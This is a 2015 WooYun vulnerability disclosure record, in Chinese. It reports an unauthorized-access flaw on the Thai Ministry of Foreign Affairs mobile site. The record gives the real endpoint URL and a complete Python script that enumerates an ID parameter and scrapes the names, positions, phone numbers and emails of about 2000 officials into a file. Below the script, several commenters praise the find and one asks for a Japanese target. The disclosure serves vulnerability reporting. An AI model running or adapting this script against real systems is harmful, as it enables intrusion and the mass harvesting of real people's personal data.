{"id": 67126, "wybug_id": "wooyun-2015-0143000", "wybug_title": "泰国外交部后台越权访问可获取大量高级官员信息", "wybug_corp": "泰国外交部", "wybug_author": "二愣子", "wybug_date": "2015-09-24 16:35", "wybug_open_date": "2015-11-12 19:34", "wybug_type": "内部绝密信息泄漏", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["内部敏感信息泄露"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-28：\tcncert国家互联网应急中心暂未能联系到相关单位，细节仅向通报机构公开\t\t\t\t\t\t\t\t\t2015-10-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向公众公开  简要描述： 懂一个人也许要忍耐要经过了意外才了解所谓的爱 详细说明：  越权访问地址：http://m.mfa.go.th/ajax/ajaxOrgMember.php?dID=N，遍历N即可（我遍历到了300）大概有2000左右的高级官员的电话，邮箱，职位部门以及个人照片   漏洞证明：  http://m.mfa.go.th/ajax/ajaxOrgMember.php?dID=1\n\n写了个简单的脚本，跑出来了大概近2000信息。\n#! /usr/bin/env python#coding=utf-8import sysimport requestsimport tablibfrom bs4 import BeautifulSoupinfolist =[]url = \"http://m.mfa.go.th/ajax/ajaxOrgMember.php?dID=\"content = '';def initCode():    reload(sys)    sys.setdefaultencoding('utf8')    def getContent(url):    try:        response = requests.get(url,timeout=2)        response.raise_for_status()        response.encoding = 'utf-8'        getPersonInfo(response.text)        sys.stdout.write('ing...\\n')        sys.stdout.flush()            except Exception,ex:        print Exception,\":\",exdef getPersonInfo(html):    global infolist    soup = BeautifulSoup(html,'lxml')    infobox = soup.findAll(\"dl\",attrs={\"class\":\"info\"})    for i in range(len(infobox)-1):        infodir = {\"name\":\"\",\"position\":\"\",\"department\":\"\",\"tel\":\"\",\"email\":\"\"}        if infobox[i+1].dd==None:            infodir['name'] = 'name'        else:            infodir['name'] = infobox[i+1].dd.text.encode('utf-8')                    if infobox[i+1].find(attrs={\"class\":\"position\"})==None:            infodir['position'] = 'position'        else:            infodir['position'] = infobox[i+1].find(attrs={\"class\":\"position\"}).text.encode('utf-8')                    if infobox[i+1].find(attrs={\"class\":\"department\"})==None:            infodir['department'] = 'department'        else:            infodir['department'] = infobox[i+1].find(attrs={\"class\":\"department\"}).text.encode('utf-8')                if infobox[i+1].find(attrs={\"class\":\"tel\"})==None:            infodir['tel'] = 'tel'        else:            infodir['tel'] = infobox[i+1].find(attrs={\"class\":\"tel\"}).text.encode('utf-8')                    if infobox[i+1].find(attrs={\"class\":\"email\"})==None:            infodir['email'] = 'email'        else:            infodir['email'] = infobox[i+1].find(attrs={\"class\":\"email\"}).text.encode('utf-8')                   infolist.append(infodir)        def saveContent(infolist):    headers = ('name','position','department','tel','email')    data=[]    data = tablib.Dataset(*data, headers=headers)    for i in range(len(infolist)):        #print infolist[i]['name']        data.append((infolist[i]['name'],infolist[i]['position'],infolist[i]['department'],infolist[i]['tel'],infolist[i]['email']))            with open('data.html', 'a') as f:        f.write(data.html)    if __name__ == \"__main__\":    initCode()    for i in range(300):        getContent(url+str(i))    saveContent(infolist)\n\n\n   修复方案：  你们更专业   版权声明：转载请注明来源 二愣子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2015-09-28 19:33 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-23 16:40 |    \t\t暴走 \t\t\t( 普通白帽子  |\t\t\t        Rank:282 漏洞数:62        | Wooyun的Rank获取如同Dota冲天梯有过之而无...)\t\t \n  SF是我的，泰国外交部..祝好..    \n     2015-09-23 16:52 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:155 漏洞数:53        | [code]时光如水，总是无言，你若安好，便是...)\t\t \n  这个。。。。牛。。啥时候来个日本的。    \n     2015-09-23 18:19 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1077 漏洞数:139        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  143000这个是靓号啊    \n     2015-09-28 20:22 |    \t\t随风的风 \t\t\t( 普通白帽子  |\t\t\t        Rank:155 漏洞数:53        | [code]时光如水，总是无言，你若安好，便是...)\t\t \n  @zeracker 143301..更靓号    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}